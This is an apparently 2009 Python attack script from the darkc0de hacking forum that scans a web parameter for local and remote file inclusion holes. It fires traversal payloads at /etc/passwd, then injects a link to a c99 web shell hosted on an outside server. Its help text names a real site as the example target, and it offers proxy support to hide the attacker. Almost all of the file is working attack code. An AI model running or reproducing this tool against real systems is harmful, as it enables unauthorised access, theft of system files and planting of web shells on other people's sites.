#!/usr/bin/python
# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# !!! Special thanx for d3hydr8 and rsauron who inspired me !!! 
#
# In version 2 added proxy support
#
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
# ---  d3hydr8 - rsauron - P47r1ck - r45c4l - C1c4Tr1Z - bennu # 
# ---  QKrun1x  - skillfaker - Croathack - Optyx - Nuclear     #
# ---  Eliminator and to all members of darkc0de and ljuska.org#                                                             #
################################################################ 

import sys, os, time, re, urllib2, socket, httplib

if sys.platform == 'linux' or sys.platform == 'linux2':
	clearing = 'clear'
else:
	clearing = 'cls'
os.system(clearing)

proxy = "None"
count = 0

if len(sys.argv) < 2 or len(sys.argv) > 4:
	print "\n|---------------------------------------------------------------|"
        print "| b4ltazar[@]gmail[dot]com                                      |"
        print "|   01/2009      LFI & RFI scanner v2.0                         |"
	print "| Help: lfi-rfi.py -h                                           |"
	print "| Visit www.darkc0de.com and www.ljuska.org                     |"
        print "|---------------------------------------------------------------|\n"
	sys.exit(1)

for arg in sys.argv:
	if arg == '-h' or arg == '--help' or arg == '-help':
		print "\n|-------------------------------------------------------------------------------|"
                print "| b4ltazar[@]gmail[dot]com                                                      |"
                print "|   01/2009      LFI & RFI scanner v2.0                                         |"
                print "| Usage: lfi-rfi.py www.site.com                                                |"
	        print "| Example: lfi-rfi.py http://toscana.adiconsum.it/index.php?pagina=             |"
		print "| Proxy: lfi-rfi.py http://toscana.adiconsum.it/index.php?pagina= -p PROXY      |"
	        print "| Visit www.darkc0de.com and www.ljuska.org                                     |"
                print "|-------------------------------------------------------------------------------|\n"
		sys.exit(1)
	elif arg == '-p':
		proxy = sys.argv[count+1]
	count += 1
	
lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]
	
site = sys.argv[1]
shell = 'http://www.defcont4.hypersite.com.br/shell/c99.txt?'
if site[:4] != "http":
	site = "http://"+site
if site[-1] != "=":
	site = site + "="
	
print "\n|---------------------------------------------------------------|"
print "| b4ltazar[@]gmail[dot]com                                      |"
print "|   01/2009      LFI & RFI scanner v2.0                         |"
print "| Visit www.darkc0de.com and www.ljuska.org                     |"
print "|---------------------------------------------------------------|\n"
print "\n[-] %s" % time.strftime("%X")
print
print "-"*80
print "\t\t\tChecking for LFI"
print "-"*80
print "\n[+] Target:",site
print "[+]",len(lfis),"LFI loaded..."
print "[+] Starting Scan...\n"

try:
	if proxy != "None":
		print "\n[+] Testing Proxy..."
		pr = httplib.HTTPConnection(proxy)
		pr.connect()
		print "[+] Proxy:",proxy
		print "[+] Building Handler"
		print
		proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'})
	else:
		print "\n[-] Proxy not given"
		print
		proxy_handler = ""
except(socket.timeout):
		print "\n[-] Proxy Timed Out"
		sys.exit(1)
except(),msg:
		print msg
		print "\n[-] Proxy Failed"
		sys.exit(1)
		

		

for lfi in lfis:
	print "[+] Checking:" ,site+lfi.replace("\n","")
	print
	proxyfier = urllib2.build_opener(proxy_handler)
	try:
		check = proxyfier.open(site+lfi.replace("\n", "")).read()
		if re.findall("root:x:", check):
			print "[!] w00t!,w00t!: ",lfi
			print
		else:
			print "[-] Not Found: ",lfi
			print
	except(urllib2.HTTPError):
			pass
	except(KeyboardInterrupt, SystemExit):
			raise
print
print "-"*80
print "\t\t\tChecking for RFI"
print "-"*80		
print "\n[+] Target:",site
print "[+] Starting Scan...\n"

try:
	check = proxyfier.open(site+'http://www.defcont4.hypersite.com.br/shell/c99.txt?').read()
	if re.findall("c99shell", check):
		print "[!] w00t!,w00t!: ",site+shell
		print
	else:
		print "[-] Not Found: ",site+shell
		print
except(urllib2.HTTPError):
		pass
except(KeyboardInterrupt, SystemExit):
		pass 
		
print 
print "\n[-] %s" % time.strftime("%X")
